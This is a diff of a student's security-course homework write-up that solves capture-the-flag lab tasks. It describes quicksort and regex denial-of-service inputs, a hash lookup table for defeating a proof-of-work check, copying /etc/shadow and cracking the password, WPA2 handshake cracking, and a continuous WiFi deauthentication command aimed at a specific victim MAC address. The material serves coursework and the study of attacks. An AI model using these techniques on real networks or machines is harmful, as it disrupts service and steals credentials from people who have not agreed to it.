@@ -8,11 +8,7 @@ b09902004 郭懷元
 
 # Security
 
-
-
 ## 2. Proof of Work & DoS 
-
-
 
 ### 3.
 
@@ -22,26 +18,11 @@ b09902004 郭懷元
 
 Flag: `HW5{c4ts_ar3_a_1ot_cut3r_th4n_柴魚}`
 
-Be reading `server.py`, we know that the flag will be shown if `qsort()` runs slow enough, and the implementation chooses pivot from the middle of the array. Therefore we can construct an input  that forces `qsort()` run in quadratic time. The "evil" input looks something like this: `... 7 5 3 1 2 4 6 ...`
+Be reading `server.py`, we know that the flag will be shown if `qsort()` runs slow enough, and the implementation chooses pivot from the middle of the array. Therefore we can construct an input  that forces `qsort()` run in quadratic time. The "evil" input looks something like this: `... 7 5 3 1 2 4 6 ...`.
 
-I add the following lines before `interactive(s)` in `example.py`:
+Code based on `example.py` to obtain the flag is in `p2-3.py`.
 
-```python
-case_str = "1"
-for i in range(2, 7200):
-    if i%2 == 0:
-        case_str = case_str+f" {i}"
-    else:
-        case_str = f"{i} "+case_str
-sendLine(s, "1")
-print("")
-print(recvUntil(s, ': ').decode(), end='')
-print("")
-sendLine(s, case_str)
-print("")
-```
-
-Then just run `python example.py`.
+![sec-p2-3](/sec-p2-3.png)
 
 ---
 
@@ -51,12 +32,32 @@ Then just run `python example.py`.
 >
 > b09902011 陳可邦
 > https://medium.com/swlh/exploiting-redos-d610e8ba531
+> https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
 
 Flag: `HW5{柴魚柴油乾柴烈火火柴砍柴柴米油鹽醬醋茶留得青山在不怕沒柴燒}`
 
-In `server.py`, we can find this regex expression: `^Dear Sophia, (.*柴魚){10,15}.*\. Best wishes, ([a-zA-Z0-9]+ ?)+\.$`. The exploitable part is `([a-zA-Z0-9]+ ?)+`. 
+Mail content: `Dear Sophia, 柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚. Best wishes, 123456789012345678901234567890@.`
 
-mail: `Dear Sophia, 柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚. Best wishes, 123456789012345678901234567890@.`
+In `server.py`, we can find this regex expression. The exploitable part is `([a-zA-Z0-9]+ ?)+\.$`, because a `+` is inside another `+`'s target pattern.
+
+When the regex engine first tries to match that pattern, `+` will try to match as many characters as possible.
+
+```
+(123456789012345678901234567890)@.
+```
+
+And mathcing will fail because of the `@`. Then the `+` inside will backtrack.
+
+```
+(12345678901234567890123456789)(0)@.
+(1234567890123456789012345678)(90)@.
+(1234567890123456789012345678)(9)(0)@.
+So on and so on...
+```
+
+Time complexity becomes exponential and DoS attacks become possible.
+
+![sec-p2-4](/sec-p2-4.png)
 
 ---
 
@@ -68,38 +69,13 @@ mail: `Dear Sophia, 柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚柴魚
 
 Flag: `HW5{y0u_shou1d_w0rk_unt1l_4.am_wi7h_m3_ev3ry_d4y!}`
 
-Certificate: `1757775784||246.7744634760556||08c0f1498914fcbfdb351c61eff3d84e8a6e11d348f51d38ce69c159233f02c6`
+Certificate: `2757602341||220.82929244357436||c504c8bf51ee18d7c1e8f7bf80afa7f5f2814843290bcf749e8fc8e9f75cfe36`
 
-Because `proof_of_work()` the random number fed to hash only ranges from 0 to 2^24-1, we can generate a table to use hashed values to lookup prehashed values.
+Because `proof_of_work()` the random number fed to hash only ranges from `0` to `2^24-1`, we can generate a table to use hashed values to lookup prehashed values.
 
-Codes to generate lookup table:
+Code to generate lookup table is in `gen_rainbow.py`. Code based on `example.py` to obtain the flag is in `p2-5.py`. Run `python gen_rainbow.py` first to generate the data needed.
 
-```python
-import json, hashlib
-rainbow = dict()
-
-for i in range(2**24):
-    hashed_i = hashlib.md5(f'{i}'.encode()).hexdigest()[0:8]
-    rainbow[hashed_i] = i
-
-jdata = json.dumps(rainbow)
-with open('rainbow.json', 'w') as f:
-    f.write(jdata)
-```
-
-Added lines in `example.py`
-
-```python
-with open('rainbow.json') as json_file:
-    rainbow = json.load(json_file)
-sendLine(s, "3")
-for i in range(10):
-    task = recvUntil(s, ': ').decode()
-    print(task, end='')
-    q = task[-12:-4]
-    sendLine(s, str(rainbow[q]))
-    print(q, str(rainbow[q]))
-```
+![sec-p2-5](/sec-p2-5.png)
 
 ---
 
@@ -115,7 +91,7 @@ for i in range(10):
 
 Flag: `HW5{R3al1y_Da_Y1_:P}`
 
-Getting the hash:
+**Getting the hash**
 
 1. Plug in the flash drive and connect it to the VM.
 2. Select `Advanced Options` and `Ubuntu, with <kernel info> (recovery)`.
@@ -124,7 +100,7 @@ Getting the hash:
 5. `cp /etc/shadow /mnt`, turn off vm.
 6. Remove every line except the line with hank, and keep only the hash. Save it as `ubuntu-hash`.
 
-Cracking the password:
+**Cracking the password**
 
 ```shell
 wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-1000000.txt
@@ -200,6 +176,10 @@ The password is `apple8787`. The flag is the filenames of files on desktop.
 
 ---
 
+### 3.
+
+1. 
+
 ## 5. WiFi Hacking
 
 > Refs:
@@ -207,8 +187,10 @@ The password is `apple8787`. The flag is the filenames of files on desktop.
 > b09902011 陳可邦
 > b09902100 林弘毅
 > https://null-byte.wonderhowto.com/how-to/hack-wi-fi-cracking-wpa2-psk-passwords-using-aircrack-ng-0148366/
-> https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142
 > https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
+> https://wiki.wireshark.org/HowToDecrypt802.11
+> https://hackernoon.com/forcing-a-device-to-disconnect-from-wifi-using-a-deauthentication-attack-f664b9940142
+
 
 ### 1.
 
@@ -249,27 +231,51 @@ Upload the `.cap` file to https://hashcat.net/cap2hccapx/ or download the execua
 
 ![sec-p5-1-2](/sec-p5-1-2.png)
 
+---
+
 ### 2.
 
 Flag: `HW5{Jo3_Tsa1-7he_M4st3r_0F_Tra1niNg}`
 
+Open `hack_wifi.cap` with WireShark. Go to `Edit` -> `Preferences` -> `Protocols` -> `IEEE 802.11`.
 
+Add a decryption key like this:
+
+![sec-p5-2-3](/sec-p5-2-3.png)
+
+Go to `Statistics` -> `Conversations` -> `TCP`. Select arbitary entry and `follow stream` because they all have the same two hosts.
+
+![sec-p5-2-1](/sec-p5-2-1.png)
+![sec-p5-2-2](/sec-p5-2-2.png)
+
+---
 
 ### 3.
 
 Flag: `HW5{j0e_ts4I_1s_d0ub1e_gun_k4i's_b3st_fr13nD}`
 
-Router MAC address: `94:BF:C4:32:CC:88` Channel: `4`
+To obtain victim's MAC address, run:
 
+```shell
+sudo airodump-ng wlo1mon --bssid 94:BF:C4:32:CC:88 -c 4 # the same command from p5-1
+```
 
+![sec-p5-3-1](/sec-p5-3-1.png)
 
+The victim's MAC address is shown in `STATION`, which is `8C:88:2B:00:73:6E`. To send attack, run:
 
+```shell
+sudo aireplay-ng --deauth 0 -c 8C:88:2B:00:73:6E -a 94:BF:C4:32:CC:88 wlo1mon
+```
 
+- `--deauth 0`: Keep sending deauthentication signal until we stop.
+- `-c`: Victim's MAC address
+- `-a`: WiFi AP's MAC address
+- `wlo1mon`: WiFi interface on my laptop
 
+Then check the web page with another device.
 
+![sec-p5-3-2](/sec-p5-3-2.png)
 
-
-
-
-
+---
 
